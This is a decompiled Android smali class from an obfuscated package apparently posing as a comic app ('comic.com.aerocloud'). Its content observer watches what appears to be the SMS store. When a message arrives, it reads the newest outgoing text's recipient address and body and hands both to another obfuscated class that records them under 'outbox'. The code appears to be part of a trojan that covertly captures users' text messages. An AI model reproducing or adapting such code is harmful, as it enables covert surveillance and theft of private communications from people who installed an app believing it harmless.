.class Lcomic/com/aerocloud/C11013l3;
.super Landroid/database/ContentObserver;


# instance fields
.field final synthetic C01O0C:Lcomic/com/aerocloud/OOCIC3I1l1O8;


# direct methods
.method public constructor <init>(Lcomic/com/aerocloud/OOCIC3I1l1O8;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lcomic/com/aerocloud/C11013l3;->C01O0C:Lcomic/com/aerocloud/OOCIC3I1l1O8;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public onChange(Z)V
    .locals 8

    const/4 v2, 0x0

    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    sget-object v0, Lcomic/com/aerocloud/C01O0C;->II083CII:Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lcomic/com/aerocloud/C11013l3;->C01O0C:Lcomic/com/aerocloud/OOCIC3I1l1O8;

    invoke-virtual {v0}, Lcomic/com/aerocloud/OOCIC3I1l1O8;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    iget-object v0, p0, Lcomic/com/aerocloud/C11013l3;->C01O0C:Lcomic/com/aerocloud/OOCIC3I1l1O8;

    invoke-virtual {v0}, Lcomic/com/aerocloud/OOCIC3I1l1O8;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    const-string v0, "protocol"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_1

    const-string v0, "_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v0

    invoke-static {}, Lcomic/com/aerocloud/OOCIC3I1l1O8;->C01O0C()J

    move-result-wide v4

    cmp-long v3, v0, v4

    if-eqz v3, :cond_1

    invoke-static {v0, v1}, Lcomic/com/aerocloud/OOCIC3I1l1O8;->C01O0C(J)J

    const-string v0, "thread_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lcomic/com/aerocloud/C01O0C;->II0ll1CC13l:Ljava/lang/String;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lcomic/com/aerocloud/C11013l3;->C01O0C:Lcomic/com/aerocloud/OOCIC3I1l1O8;

    invoke-virtual {v0}, Lcomic/com/aerocloud/OOCIC3I1l1O8;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    const-string v1, "address"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "body"

    invoke-interface {v7, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v7, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcomic/com/aerocloud/C18Cl1C;

    invoke-direct {v3}, Lcomic/com/aerocloud/C18Cl1C;-><init>()V

    invoke-virtual {v3, v6}, Lcomic/com/aerocloud/C18Cl1C;->C11ll3(Landroid/content/Context;)Z

    invoke-virtual {v3, v1, v2}, Lcomic/com/aerocloud/C18Cl1C;->C101lC8O(Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    const-string v4, "outbox"

    invoke-static {v6, v4, v1, v2, v3}, Lcomic/com/aerocloud/OOCIC3I1l1O8;->C01O0C(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V

    :cond_0
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_1
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    return-void
.end method
